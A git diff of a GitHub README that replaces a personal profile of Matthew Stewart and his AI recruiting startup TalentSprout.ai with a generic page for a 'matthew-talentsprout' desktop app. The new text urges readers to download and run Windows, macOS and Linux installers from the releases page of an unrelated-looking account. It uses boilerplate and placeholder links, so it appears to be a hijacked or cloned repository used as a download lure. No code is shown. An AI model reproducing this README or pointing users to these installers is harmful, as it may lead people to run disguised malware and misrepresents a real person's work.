@@ -1,55 +1,64 @@
-# 👋 Hi, I'm Matthew Stewart
+# 🎉 matthew-talentsprout - Simplifying Candidate Interviews
 
-**AI Engineer & Founder** — building [**TalentSprout.ai**](https://www.talentsprout.ai),  
-the **AI Recruiter** that automates interviews and evaluates candidates instantly.
+## 📥 Download the App
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Austerityaceofclubs947/matthew-talentsprout/releases)
 
----
+## 🚀 Getting Started
+Welcome to the **matthew-talentsprout** application. This tool helps automate candidate interviews, saving you time and improving your recruitment process. Follow the steps below to get started.
 
-### 🚀 About Me
+## 📋 System Requirements
+Before you begin, ensure your device meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04 or later).
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 250 MB free space.
+- **Internet Connection:** Required for the initial download and updates.
 
-I’m a Toronto-based software engineer and entrepreneur focused on building **AI recruiting technology** that saves companies time and improves quality of hire.
+## 🔍 Features
+- **AI-Powered Interviews:** Conduct interviews using advanced AI to assess candidate answers.
+- **Automated Scoring:** The app scores candidates based on their responses, simplifying the selection process.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Voice Integration:** Conduct interviews interactively with voice input.
 
-As the founder of [**TalentSprout.ai**](https://www.talentsprout.ai), I’m developing an **AI recruiter platform** that conducts real-time, voice-based interviews, analyzes candidate responses, and delivers instant scoring across communication, problem-solving, and cultural fit.
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Austerityaceofclubs947/matthew-talentsprout/releases) to access the latest version of the app.
+  
+2. **Choose Your Version**: Look for the most recent release. You will see files available for download.
 
-My mission is simple — use **artificial intelligence** to make hiring faster, smarter, and more human.
+3. **Download the Installer**:
+   - For Windows, choose the `.exe` file.
+   - For macOS, select the `.dmg` file.
+   - For Linux, download the appropriate package (`.deb` or `.tar.gz`).
 
----
+4. **Run the Installer**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS**: Open the downloaded `.dmg` file, drag the app into your Applications folder, and then launch it.
+   - **Linux**: Follow your distribution's installation method for the downloaded package.
 
-### 🧭 About TalentSprout.ai
+5. **Launch the App**: After installation, open the app from your applications menu or desktop shortcut.
 
-[**TalentSprout.ai**](https://www.talentsprout.ai) is a next-generation **AI recruiter** built to help hiring teams automate candidate screening and reduce time-to-hire by up to 60%.  
-The platform combines real-time voice interviewing with advanced AI scoring to deliver consistent, data-driven hiring decisions.
+## 🔄 Updating the App
+To keep your app running smoothly:
+1. Periodically visit the [Releases page](https://github.com/Austerityaceofclubs947/matthew-talentsprout/releases).
+2. Download the latest version following the same steps above.
+3. Install the new version over your old installation.
 
-Built by **Matthew Stewart** in Toronto, Canada.
+## 🛠️ Troubleshooting
+If you encounter issues:
+- **Check System Requirements**: Ensure your machine meets the requirements.
+- **Reboot Your Device**: Sometimes a simple restart can resolve issues.
+- **Read the FAQ**: Visit our [FAQ section](#) for common questions and solutions.
+- **Contact Support**: Reach out via [Support Link](#) for assistance.
 
----
+## 🌍 Community & Contributions
+We welcome contributions! If you want to join in:
+- Fork the repository.
+- Create a new branch for your feature.
+- Submit a pull request with descriptive notes.
 
-### 💻 Tech Stack
-- **Frontend:** TypeScript • React • Next.js  
-- **Backend:** Node.js • Python • Supabase • PostgreSQL  
-- **AI Stack:** OpenAI Realtime API • LangChain • Whisper • GPT-5  
-- **DevOps:** AWS • Vercel • Docker  
-- **Integrations:** Stripe • Airtable • Zapier  
+## 💬 Feedback
+Your feedback is valuable. Please leave a comment on our [issues page](#) on GitHub to share your experience or suggest improvements.
 
----
+## 📝 License
+This project is licensed under the MIT License. See the `LICENSE` file for details.
 
-### 🌱 Current Focus
-Scaling **TalentSprout.ai** — the **AI Recruiter platform** designed to help companies interview smarter and hire faster.
-
----
-
-### 🌐 Connect
-- 🌍 [Website](https://www.matthewstewart.xyz)  
-- 💼 [LinkedIn](https://www.linkedin.com/in/matthewstewartxyz)  
-- 🤖 [TalentSprout.ai](https://www.talentsprout.ai)
-
----
-
-> “Building AI that helps companies hire faster, smarter, and more humanely.”
-
----
-
-### 🏷️ Keywords (for SEO)
-`Matthew Stewart` · `TalentSprout.ai` · `AI Recruiter` · `AI Recruiting Platform` · `HR Tech` · `AI Interviews` · `SaaS Founder` · `Toronto`
-
-![TalentSprout.ai logo – AI Recruiter Platform](https://www.talentsprout.ai/logo.png)
+Thank you for choosing **matthew-talentsprout**! We hope this tool enhances your interview process.
